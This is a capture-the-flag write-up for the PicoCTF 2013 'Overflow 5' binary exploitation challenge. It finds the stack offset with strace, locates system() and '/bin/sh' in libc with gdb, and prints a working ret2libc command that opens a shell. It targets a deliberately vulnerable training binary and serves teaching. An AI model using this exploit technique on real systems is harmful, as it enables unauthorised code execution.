# PicoCTF 2013: Overflow 5

**Category:** Binary Exploitation
**Points:** 190
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_5_0353c1a83cb2fa0d , downloadable [here](https://2013.picoctf.com/problems/overflow5-0353c1a83cb2fa0d). Source is not
>available for this problem.

>If you solve the problem you will be able to read the key file by running

>cat /problems/stack_overflow_5_0353c1a83cb2fa0d/key
>on the PicoCTF shell machine.

>**Hint:** Now you don't have source, and you aren't allowed to execute code
>on the stack. Keep calm and objdump -d


## Write-up
**Disclaimer: I've spoken to people who solved this during the actual contest. They
said that using ulimit to solve this problem was encouraged and/or hinted at by
the creators. In addition, I haven't been able to exploit it with ASLR
enabled.**

**Disclaimer 2: While the technique will remain the same, solving this on the
server will yield very different results.**

No source. The first thing we should do is just find the offset to hijack `%eip`
```
$ strace ./overflow5-0353c1a83cb2fa0d $(python -c 'print "A"*1036 + "BBBB"')
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```
1036 bytes and then we have control over eip. Now what we do is use gdb with
the ASLR disabled to find the address of some important items, namely
`system()` and the address of "/bin/sh" in libc.
```
$ setarch `uname -m` -R gdb -q ./overflow5-0353c1a83cb2fa0d
Reading symbols from ./overflow5-0353c1a83cb2fa0d...(no debugging symbols
found)...done.
(gdb) b*main
Breakpoint 1 at 0x80483c0
(gdb) r
Starting program:
/vagrant/write-ups-2013/pico-ctf-2013/overflow-5/overflow5-0353c1a83cb2fa0d

Breakpoint 1, 0x080483c0 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e62190 <system>
(gdb) info proc map
process 6912
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x8049000     0x1000        0x0 /vagrant/write-ups-2013/pico-ctf-2013/overflow-5/overflow5-0353c1a83cb2fa0d
     0x8049000  0x804a000     0x1000        0x0 /vagrant/write-ups-2013/pico-ctf-2013/overflow-5/overflow5-0353c1a83cb2fa0d
     0x804a000  0x804b000     0x1000     0x1000 /vagrant/write-ups-2013/pico-ctf-2013/overflow-5/overflow5-0353c1a83cb2fa0d
    0xf7e21000 0xf7e22000     0x1000        0x0
    0xf7e22000 0xf7fca000   0x1a8000        0x0 /lib/i386-linux-gnu/libc-2.19.so
    0xf7fca000 0xf7fcc000     0x2000   0x1a8000 /lib/i386-linux-gnu/libc-2.19.so
    0xf7fcc000 0xf7fcd000     0x1000   0x1aa000 /lib/i386-linux-gnu/libc-2.19.so
    0xf7fcd000 0xf7fd0000     0x3000        0x0
    0xf7fd9000 0xf7fdb000     0x2000        0x0
    0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
    0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.19.so
    0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.19.so
    0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.19.so
    0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e22000, +9999999,"/bin/sh"
0xf7f82a24
```
Now that we have the address of system and "/bin/sh" we can happily call that
function, providing /bin/sh as the argument

```
setarch `uname -m` -R  ./overflow5-0353c1a83cb2fa0d $(python -c 'print "A"*1036
+ "\x90\x21\xe6\xf7" + "JUNK" + "\x24\x2a\xf8\xf7"')
```
pwn.

## Other write-ups and resources

* none yet
